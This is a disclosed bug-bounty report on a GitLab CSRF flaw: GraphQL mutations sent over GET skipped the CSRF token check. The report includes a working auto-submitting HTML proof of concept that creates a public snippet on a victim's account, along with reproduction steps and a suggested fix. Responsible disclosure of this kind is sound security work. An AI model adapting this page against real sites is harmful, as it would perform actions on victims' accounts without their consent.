# CSRF on /api/graphql allows executing mutations through GET requests

## Report Details
- **Report ID**: 1122408
- **URL**: https://hackerone.com/reports/1122408
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-03-10T16:49:12.826Z
- **Disclosed**: 2021-08-02T19:10:34.660Z

## Reporter
- **Username**: az3z3l
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Mutations are `edit` or `create`  queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection


### Code for Testing

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>


    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```
This exploit would create a snippet named `Tesssst Snippet` on the user's account. 


### Steps to Reproduce

1. Host this file
2. Login to gitlab
3. Open the link to that html
4. Check the snippets for the logged in user. 


### Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.


### POC

Attached the request and response screenshot



### What is the expected *correct* behavior?

The backend must check the existence of csrf tokens for GET requests as well.

## Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.

## Attachments
- gitlabCreateSnippet.png
